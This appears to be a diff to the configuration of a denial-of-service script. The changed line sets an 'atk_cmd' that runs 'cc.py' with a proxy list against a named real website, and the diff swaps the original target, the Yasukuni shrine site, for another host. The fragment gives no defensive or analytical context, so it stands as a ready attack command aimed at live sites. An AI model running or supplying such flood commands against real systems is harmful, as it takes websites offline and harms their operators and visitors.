@@ -7,7 +7,7 @@
 #
 #the command you want to exec
 
-atk_cmd="python3 cc.py -url https://www.yasukuni.or.jp/ -down -f proxy.txt -v 5 -check"
+atk_cmd="python3 cc.py -url https://port.moonport.top/ -down -f proxy.txt -v 5 -check"
 
 pip3 install requests pysocks
 
